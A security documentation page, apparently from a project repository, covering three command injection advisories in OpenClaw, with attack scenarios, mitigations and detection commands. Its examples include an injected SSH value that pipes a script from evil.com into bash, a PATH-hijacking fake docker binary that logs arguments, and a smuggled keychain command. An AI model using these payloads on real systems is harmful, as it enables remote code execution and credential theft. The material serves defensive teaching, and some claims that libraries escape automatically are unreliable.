# Command Injection

## Overview

Command injection vulnerabilities allow attackers to inject malicious commands into system calls, leading to arbitrary code execution. In OpenClaw, command injection has been discovered in environment variable manipulation, SSH command construction, and shell-based credential operations.

**Impact**: Remote code execution, privilege escalation, and full system compromise.

**Relationship to RCE**: Command injection is a specific type of RCE attack where malicious commands are injected into shell operations. While [RCE vulnerabilities](./rce.md) cover broader code execution attacks, command injection focuses on shell command manipulation.

## Vulnerability List

### High Severity

| Advisory | CVE | Summary | Fixed In |
|----------|-----|---------|----------|
| [GHSA-mc68-q9jw-2h3v](https://github.com/openclaw/openclaw/security/advisories/GHSA-mc68-q9jw-2h3v) | — | Command injection via PATH environment variable during Docker execution | v2026.1.29 |
| [GHSA-q284-4pvr-m585](https://github.com/openclaw/openclaw/security/advisories/GHSA-q284-4pvr-m585) | CVE-2026-25157 | OS command injection in sshNodeCommand | v2026.1.29 |
| [GHSA-4564-pvr2-qq4h](https://github.com/openclaw/openclaw/security/advisories/GHSA-4564-pvr2-qq4h) | CVE-2026-27487 | Shell injection during macOS Keychain credential write | v2026.2.14 |

**Total**: 3 advisories (all high severity)

## Attack Scenarios

### 1. PATH Environment Variable Injection (GHSA-mc68-q9jw-2h3v)

**Attack Vector**: Manipulate the `PATH` environment variable to redirect command execution to attacker-controlled binaries during Docker operations.

**Example**:
```bash
# Attacker sets PATH to include malicious directory
export PATH="/tmp/evil:$PATH"

# Create malicious 'docker' binary
cat > /tmp/evil/docker << 'EOF'
#!/bin/bash
# Log credentials and forward to real docker
echo "Intercepted: $@" >> /tmp/stolen.log
/usr/bin/docker "$@"
EOF
chmod +x /tmp/evil/docker

# OpenClaw executes 'docker' command, runs attacker's binary
# Attacker intercepts all docker arguments including secrets
```

**Impact**:
- Credential theft (docker credentials, API keys)
- Command manipulation
- Container escape

### 2. sshNodeCommand Injection (GHSA-q284-4pvr-m585, CVE-2026-25157)

**Attack Vector**: Inject shell metacharacters into SSH node command parameters, leading to arbitrary command execution on remote nodes.

**Example**:
```javascript
// Vulnerable code (simplified)
const nodeCommand = `ssh user@${nodeHost} "${userInput}"`;
exec(nodeCommand);

// Attacker input
userInput = 'benign_command"; curl http://evil.com/shell.sh | bash #'

// Executed command
// ssh user@node "benign_command"; curl http://evil.com/shell.sh | bash #"
```

**Impact**:
- Remote code execution on SSH nodes
- Lateral movement in multi-node deployments
- Credential harvesting

### 3. macOS Keychain Shell Injection (GHSA-4564-pvr2-qq4h, CVE-2026-27487)

**Attack Vector**: Inject shell commands through keychain service name or account name parameters during credential write operations.

**Example**:
```bash
# Vulnerable keychain operation (simplified)
security add-generic-password -s "$serviceName" -a "$accountName" -w "$password"

# Attacker-controlled service name
serviceName='MyService"; echo "pwned" > /tmp/hacked; #'

# Executed command
# security add-generic-password -s "MyService"; echo "pwned" > /tmp/hacked; #" -a "user" -w "pass"
```

**Impact**:
- Arbitrary command execution with user privileges
- Keychain data exfiltration
- Persistent backdoor installation

## Common Injection Techniques

### Shell Metacharacter Injection

| Metacharacter | Purpose | Example |
|--------------|---------|---------|
| `;` | Command separator | `cmd1; cmd2` |
| `&&` | AND operator | `cmd1 && cmd2` |
| `\|` | Pipe operator | `cmd1 \| cmd2` |
| `$()` | Command substitution | `$(malicious_cmd)` |
| `` ` `` | Command substitution (backticks) | `` `malicious_cmd` `` |
| `>` | Output redirection | `cmd > /tmp/output` |
| `#` | Comment (ignore rest) | `cmd #ignore_this` |
| `\n` | Newline injection | `cmd\nmalicious_cmd` |

### Environment Variable Manipulation

```bash
# PATH injection
PATH="/tmp/evil:$PATH"

# LD_PRELOAD injection (Linux)
LD_PRELOAD="/tmp/evil.so"

# DYLD_INSERT_LIBRARIES injection (macOS)
DYLD_INSERT_LIBRARIES="/tmp/evil.dylib"
```

## Mitigation

### 1. Avoid Shell Execution

**Best Practice**: Use direct system calls instead of shell commands.

```javascript
// ❌ Vulnerable - uses shell
const { exec } = require('child_process');
exec(`ssh user@${host} ${command}`);

// ✅ Secure - no shell
const { execFile } = require('child_process');
execFile('ssh', ['user@' + host, command], { shell: false });
```

### 2. Input Validation and Sanitization

**Allowlist Approach** (recommended):
```javascript
function sanitizeCommand(input) {
  // Only allow alphanumeric, dash, underscore
  if (!/^[a-zA-Z0-9_-]+$/.test(input)) {
    throw new Error('Invalid command');
  }
  return input;
}
```

**Escape Special Characters** (fallback):
```javascript
function escapeShellArg(arg) {
  // Wrap in single quotes and escape any single quotes
  return "'" + arg.replace(/'/g, "'\\''") + "'";
}
```

### 3. Use Parameterized APIs

When available, use parameterized APIs that handle escaping automatically:

```javascript
// ✅ Parameterized SSH execution
const { NodeSSH } = require('node-ssh');
const ssh = new NodeSSH();
await ssh.connect({ host, username, privateKey });
await ssh.execCommand(command); // Automatically escaped
```

### 4. Environment Variable Hardening

**Sanitize Environment**:
```javascript
// Remove dangerous environment variables
const safeEnv = {
  ...process.env,
  PATH: '/usr/bin:/bin', // Reset PATH
  LD_PRELOAD: undefined,
  DYLD_INSERT_LIBRARIES: undefined
};

execFile('command', args, { env: safeEnv });
```

**Validate PATH**:
```javascript
function validatePath(path) {
  const safePaths = ['/usr/bin', '/bin', '/usr/local/bin'];
  const pathDirs = path.split(':');

  for (const dir of pathDirs) {
    if (!safePaths.includes(dir)) {
      throw new Error(`Unsafe PATH directory: ${dir}`);
    }
  }
}
```

### 5. Platform-Specific Defenses

#### macOS Keychain Operations

```bash
# ✅ Use keychain API with proper quoting
security add-generic-password \
  -s "$(printf '%s' "$serviceName")" \
  -a "$(printf '%s' "$accountName")" \
  -w "$(printf '%s' "$password")"
```

#### SSH Command Construction

```javascript
// ✅ Use ssh-exec library with parameterization
const sshExec = require('ssh-exec');
sshExec(command, {
  host: host,
  user: user,
  key: privateKey
}, (err, stdout, stderr) => {
  // Command executed safely
});
```

### 6. Runtime Monitoring

Enable runtime checks to detect command injection attempts:

```bash
# Enable audit logging for exec calls
auditctl -w /usr/bin/bash -p x -k command_exec
auditctl -w /bin/sh -p x -k command_exec

# Monitor for suspicious environment variables
auditctl -w /proc/self/environ -p r -k env_read
```

## Detection

### Static Analysis

```bash
# Search for vulnerable exec patterns
grep -r "exec(" --include="*.js" --include="*.ts"
grep -r "spawn(" --include="*.js" --include="*.ts"
grep -r "child_process" --include="*.js" --include="*.ts"

# Check for shell invocation
grep -r "shell: true" --include="*.js" --include="*.ts"
```

### Runtime Detection

**Log Analysis**:
```bash
# Check for shell metacharacters in command logs
grep -E '[;|&$`]' /var/log/openclaw/commands.log

# Monitor for PATH manipulation
grep "PATH=" /var/log/openclaw/audit.log
```

**Anomaly Detection**:
- Unexpected commands executed
- Non-standard PATH values
- LD_PRELOAD or DYLD_INSERT_LIBRARIES set

## Related Resources

- **Vulnerability Documentation**:
  - [RCE Vulnerabilities](./rce.md) - Broader RCE attack vectors
  - [Exec Bypass](./exec-bypass.md) - Exec allowlist bypass techniques
- **Testing**: Test cases available in `tests/agent-hijack/` directory (Tests 6, 7, 8)
- **Best Practices**:
  - [Hardening Guide - Command Execution](../best-practices/hardening-guide.md)
- **Test Guide**: [Agent Hijack Testing Guide](../test-cases/agent-hijack-guide.md)

## References

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CWE-88**: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')
- **CWE-77**: Improper Neutralization of Special Elements used in a Command ('Command Injection')
- **OWASP**: [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- **MITRE ATT&CK**: T1059 (Command and Scripting Interpreter)
